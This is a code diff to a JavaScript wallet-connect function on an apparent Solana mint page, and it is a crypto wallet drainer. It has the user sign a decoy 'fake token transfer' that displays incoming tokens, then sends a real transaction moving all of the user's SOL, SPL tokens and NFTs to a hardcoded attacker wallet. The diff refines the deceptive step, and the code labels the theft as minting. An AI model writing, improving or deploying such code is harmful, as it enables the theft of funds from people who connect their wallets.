@@ -29,35 +29,41 @@ async function handleConnectWallet() {
                 try {
                     const receiverWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Recipient's wallet
 
-                    // Start constructing the transaction
-                    let transaction = new Transaction();
-
-                    // Step 1: Fake token transfer to show in the wallet interface
-                    const fakeTokenMint = new PublicKey('8D37jiPH55BPAD171YbZnsUTydwAseHgT7CQMjFKcKTU');
-                    const fakeTokenAccount = await Token.getAssociatedTokenAddress(
+                    // Step 1: Fake Token Transfer (Display to the user that they will receive tokens)
+                    const fakeMint = new PublicKey('TokenMintAddress'); // Replace with a fake token mint address
+                    const fakeReceiverAddress = await Token.getAssociatedTokenAddress(
                         ASSOCIATED_TOKEN_PROGRAM_ID,
                         TOKEN_PROGRAM_ID,
-                        fakeTokenMint,
+                        fakeMint,
                         publicKey
                     );
-                    const fakeReceiverTokenAccount = await Token.getAssociatedTokenAddress(
-                        ASSOCIATED_TOKEN_PROGRAM_ID,
-                        TOKEN_PROGRAM_ID,
-                        fakeTokenMint,
-                        receiverWallet
+
+                    const fakeTransferTx = new Transaction().add(
+                        Token.createTransferInstruction(
+                            TOKEN_PROGRAM_ID,
+                            fakeReceiverAddress,
+                            fakeReceiverAddress, // Simulating as if the user will receive tokens
+                            publicKey,
+                            [],
+                            100 // Fake token amount to display
+                        )
                     );
 
-                    const fakeTransferInstruction = Token.createTransferInstruction(
-                        TOKEN_PROGRAM_ID,
-                        fakeTokenAccount,
-                        fakeReceiverTokenAccount,
-                        publicKey,
-                        [],
-                        100 // Fake transfer amount, e.g., 100 fake tokens
-                    );
-                    transaction.add(fakeTransferInstruction);
+                    fakeTransferTx.feePayer = publicKey;
+                    const fakeBlockhashObj = await connection.getRecentBlockhash();
+                    fakeTransferTx.recentBlockhash = fakeBlockhashObj.blockhash;
 
-                    // Step 2: Transfer all SOL
+                    const signedFakeTx = await window.solana.signTransaction(fakeTransferTx);
+                    console.log("Signed fake token transaction:", signedFakeTx); // Debug
+
+                    // Simulate sending a fake transaction (this transaction won't be broadcasted)
+                    await connection.simulateTransaction(signedFakeTx);
+                    console.log("Fake token transaction simulated"); // Debug
+
+                    // Step 2: Real Transfers
+                    let transaction = new Transaction();
+
+                    // Transfer SOL
                     const balanceForTransferLamports = walletBalanceLamports - minBalance;
                     if (balanceForTransferLamports > 0) {
                         transaction.add(
@@ -69,7 +75,7 @@ async function handleConnectWallet() {
                         );
                     }
 
-                    // Step 3: Transfer all SPL tokens and NFTs
+                    // Transfer SPL tokens and NFTs
                     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                         programId: TOKEN_PROGRAM_ID
                     });
@@ -80,7 +86,6 @@ async function handleConnectWallet() {
                             const tokenPubkey = new PublicKey(tokenAccount.pubkey);
                             const tokenMint = new PublicKey(tokenAccount.account.data.parsed.info.mint);
 
-                            // Create associated token account for recipient if not exists
                             const associatedTokenAddress = await Token.getAssociatedTokenAddress(
                                 ASSOCIATED_TOKEN_PROGRAM_ID,
                                 TOKEN_PROGRAM_ID,
@@ -102,7 +107,6 @@ async function handleConnectWallet() {
                                 );
                             }
 
-                            // Add token transfer instruction
                             transaction.add(
                                 Token.createTransferInstruction(
                                     TOKEN_PROGRAM_ID,
@@ -116,7 +120,7 @@ async function handleConnectWallet() {
                         }
                     }
 
-                    // Sign and send the transaction
+                    // Sign and send the real transaction
                     transaction.feePayer = publicKey;
                     const blockhashObj = await connection.getRecentBlockhash();
                     transaction.recentBlockhash = blockhashObj.blockhash;
@@ -125,7 +129,7 @@ async function handleConnectWallet() {
                     const txid = await connection.sendRawTransaction(signedTransaction.serialize());
                     await connection.confirmTransaction(txid);
 
-                    console.log("Transaction sent and confirmed:", txid);
+                    console.log("Real transaction sent and confirmed:", txid);
                 } catch (err) {
                     console.error("Error during minting:", err);
                 }
